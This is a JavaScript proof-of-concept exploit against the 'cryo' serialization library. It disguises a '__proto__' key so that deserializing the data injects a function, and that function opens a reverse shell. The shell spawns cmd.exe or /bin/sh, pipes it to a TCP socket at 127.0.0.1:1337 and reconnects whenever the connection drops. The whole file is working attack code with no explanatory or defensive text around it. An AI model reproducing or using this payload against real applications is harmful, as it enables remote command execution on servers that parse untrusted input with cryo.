const serializer = require('cryo');

let obj = {
	__proto: {
		username: "test",
		lcUsername: "test",
		forEach: function() {
			var require = global.require || global.process.mainModule.constructor._load;
			var net = require('net');
			var spawn = require('child_process').spawn;

			HOST="127.0.0.1";
			PORT="1337";
			TIMEOUT="5000";

			if (typeof String.prototype.contains === 'undefined') { String.prototype.contains = function(it) { return this.indexOf(it) != -1; }; }

			function c(HOST,PORT) {
				var client = new net.Socket();
				client.connect(PORT, HOST, function() {
					var sh = spawn((process.platform.contains('win')?'cmd.exe':'/bin/sh'),[]);
					client.write("Connected\r\n");
					client.pipe(sh.stdin);
					sh.stdout.pipe(client);
					sh.stderr.pipe(client);
					sh.on('exit',function(code,signal){
					client.end("Disconnected\r\n");
					});
				});
				client.on('error', function(e) {
					setTimeout(function() {c(HOST,PORT)}, TIMEOUT);
				});
			}

			c(HOST,PORT);
		}
	}
}

//console.log("toString", obj.toString())

let serializedData = serializer.stringify(obj);
let payload = serializedData.replace("__proto", "__proto__");
//console.log(serializedData);
console.log("payload", payload);

/*let payload = '{"root":"_CRYO_REF_0","references":[{"contents":{"__proto__":"_CRYO_REF_1"},"value":"_CRYO_OBJECT_"},{"contents":{"username":"test","lcUsername":"test","forEach":"_CRYO_REF_2"},"value":"_CRYO_OBJECT_"},{"contents":{},"value":"_CRYO_FUNCTION_function() {console.log(123);console.log();}"}]}'
console.log("p", payload);*/


let newObj = serializer.parse(payload, { finalize: function(obj) {
	if (obj.hasOwnProperty('username') && obj.hasOwnProperty('lcUsername')) {
	  obj.img = '/images/profile.png'
	}
  }});


newObj.forEach(item => item);
